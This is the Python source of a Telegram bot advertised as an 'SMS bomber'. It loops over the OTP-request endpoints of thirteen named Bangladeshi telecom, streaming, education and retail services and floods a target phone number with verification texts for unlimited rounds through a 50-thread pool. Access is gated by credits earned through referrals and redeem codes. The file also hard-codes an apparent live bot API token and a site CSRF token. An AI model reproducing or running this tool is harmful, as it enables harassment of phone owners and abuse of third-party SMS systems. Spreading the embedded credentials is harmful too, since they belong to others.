import telebot
import requests
import threading
import time
import os
import json
import random
import string
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
from telebot import types
from datetime import datetime

# ==========================================
# 🌐 WEB SERVER
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Supreme Advance Bot is Online!"

def run_web_server():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  
OWNER_ID = 6941003064              # Apnar ID thikmoto boshan
OWNER_NAME = "Suptho Hpd"
OWNER_USERNAME = "Suptho1_"
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'supreme_db.json'

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": [], "total_bombing": 0}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": [], "total_bombing": 0}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🚀 API ENGINE (13 APIs - 100% Same to Same)
# ==========================================

def shopbase_api(target):
    url = "https://shopbasebd.com/store/registration/sendOTP"
    try: requests.post(url, data=f"number={target}&_token=ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo", timeout=3)
    except: pass

def apex_api(target):
    url = "https://api.apex4u.com/api/auth/login"
    try: requests.post(url, json={"phoneNumber": target}, timeout=3)
    except: pass

def bikroy_api(target):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}"
    try: requests.get(url, timeout=3)
    except: pass

def banglalink_api(target):
    url = "https://web-api.banglalink.net/api/v1/user/otp-login/request"
    try: requests.post(url, json={"mobile": target}, timeout=3)
    except: pass

def grameenphone_api(target):
    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
    try: requests.post(url, data=f"msisdn={target}", timeout=3)
    except: pass

def airtel_api(target):
    url = "https://www.bd.airtel.com/en"
    headers = {"next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e"}
    try: requests.post(url, headers=headers, data=f'[{"msisdn":"{target}"}]', timeout=3)
    except: pass

def chorki_api(target):
    url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web"
    try: requests.post(url, json={"number": f"+88{target}"}, timeout=3)
    except: pass

def hoichoi_api(target):
    url = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
    try: requests.post(url, json={"phoneNumber": f"+88{target}", "platform": "MOBILE_WEB"}, timeout=3)
    except: pass

def bioscope_api(target):
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web"
    try: requests.post(url, json={"number": f"+88{target}"}, timeout=3)
    except: pass

def shikho_api(target):
    url = "https://api.shikho.com/auth/v2/send/sms"
    try: requests.post(url, json={"phone": f"88{target}", "type": "student", "auth_type": "signup", "vendor": "shikho"}, timeout=3)
    except: pass

def bohubrihi_api(target):
    url = "https://bb-api.bohubrihi.com/public/activity/otp"
    try: requests.post(url, json={"phone": target, "intent": "login"}, timeout=3)
    except: pass

def rokomari_api(target):
    url = f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}&countryCode=BD"
    try: requests.get(url, timeout=3)
    except: pass

def ecourier_api(target):
    url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}"
    try: requests.get(url, timeout=3)
    except: pass

def attack_executor(target, amount):
    apis = [shopbase_api, apex_api, bikroy_api, banglalink_api, grameenphone_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, shikho_api, bohubrihi_api, rokomari_api, ecourier_api]
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(amount):
            for run_api in apis:
                executor.submit(run_api, target)

# ==========================================
# 🤖 BOT INTERFACE
# ==========================================

def is_joined(user_id):
    try:
        res = bot.get_chat_member(CHANNEL_ID, user_id)
        return res.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    args = message.text.split()
    
    if uid not in db['users']:
        referrer = args[1] if len(args) > 1 and args[1] in db['users'] else None
        if referrer and referrer != uid:
            db['users'][referrer]['credits'] += 5
            try: bot.send_message(referrer, f"🎉 Referral Bonus! You got 5 credits.")
            except: pass
        db['users'][uid] = {"credits": 5, "ref_count": 0, "total_sent": 0, "join_date": datetime.now().strftime("%Y-%m-%d")}
        save_data(db)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Bomb", "👤 My Profile")
    markup.add("👥 Refer & Earn", "💰 Redeem Credit")
    markup.add("👑 Admin Support")
    bot.send_message(message.chat.id, f"🔥 **SUPTHO ADVANCE BOMBER** 🔥", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handle_menu(message):
    uid = str(message.from_user.id)
    
    # Global Admin Command Handlers (Menu logic ignore korbe)
    if message.text.startswith('/'):
        return

    if not is_joined(message.from_user.id):
        return bot.reply_to(message, f"❌ Join Channel: {CHANNEL_ID}")

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 Number din (11 digit):")
        bot.register_next_step_handler(msg, ask_amount)
    
    elif message.text == "👤 My Profile":
        u = db['users'].get(uid, {"credits": 0})
        cred = "Unlimited" if int(uid) == OWNER_ID else u['credits']
        text = f"👤 **PROFILE**\n\n🆔 ID: `{uid}`\n💰 Balance: `{cred}`\n🔥 Total SMS: `{u.get('total_sent', 0)}`"
        bot.reply_to(message, text, parse_mode='Markdown')

    elif message.text == "👥 Refer & Earn":
        link = f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.reply_to(message, f"🎁 Invite link:\n`{link}`\n\nGet 5 credits per refer.")

    elif message.text == "💰 Redeem Credit":
        msg = bot.reply_to(message, "🎁 Redeem Code din:")
        bot.register_next_step_handler(msg, redeem_code)

    elif message.text == "👑 Admin Support":
        bot.reply_to(message, f"👑 Owner: {OWNER_NAME}\n💬 Support: {OWNER_USERNAME}")

# --- Bombing Logic ---
def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11: return bot.reply_to(message, "❌ Wrong Number!")
    msg = bot.reply_to(message, f"🎯 Target: `{target}`\n🔢 Round amount din (No Limit):")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No Credits!")
            db['users'][uid]['credits'] -= 1
        
        db['users'][uid]['total_sent'] += (amount * 13)
        save_data(db)
        bot.send_message(message.chat.id, f"🚀 **Bombing Started!**")
        threading.Thread(target=attack_executor, args=(target, amount)).start()
    except: bot.reply_to(message, "❌ Invalid Amount!")

def redeem_code(message):
    code, uid = message.text.strip(), str(message.from_user.id)
    if code in db['codes']:
        db['codes'].remove(code)
        db['users'][uid]['credits'] += 10
        save_data(db); bot.reply_to(message, "✅ 10 Credits Added!")
    else: bot.reply_to(message, "❌ Invalid Code.")

# ==========================================
# 👑 ADMIN COMMANDS (FIXED)
# ==========================================

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id != OWNER_ID: return
    text = "👑 **ADMIN PANEL**\n\n/stats - Bot Status\n/gencodes <num> - Gen Codes\n/broadcast <msg> - Send to all"
    bot.reply_to(message, text)

@bot.message_handler(commands=['stats'])
def admin_stats(message):
    if message.from_user.id != OWNER_ID: return
    bot.reply_to(message, f"📊 Total Users: {len(db['users'])}\n🔑 Active Codes: {len(db['codes'])}")

@bot.message_handler(commands=['gencodes'])
def admin_gen(message):
    if message.from_user.id != OWNER_ID: return
    try:
        num = int(message.text.split()[1])
        codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) for _ in range(num)]
        db['codes'].extend(codes); save_data(db)
        bot.reply_to(message, f"✅ Codes: `{', '.join(codes)}`", parse_mode='Markdown')
    except: bot.reply_to(message, "Usage: /gencodes 5")

@bot.message_handler(commands=['broadcast'])
def admin_bc(message):
    if message.from_user.id != OWNER_ID: return
    msg_text = message.text.replace("/broadcast ", "")
    if not msg_text or msg_text == "/broadcast": return bot.reply_to(message, "Message din!")
    
    count = 0
    for user in db['users']:
        try:
            bot.send_message(user, f"📢 **ADMIN MESSAGE:**\n\n{msg_text}")
            count += 1
        except: pass
    bot.reply_to(message, f"✅ Sent to {count} users.")

if __name__ == "__main__":
    keep_alive()
    bot.polling(non_stop=True)
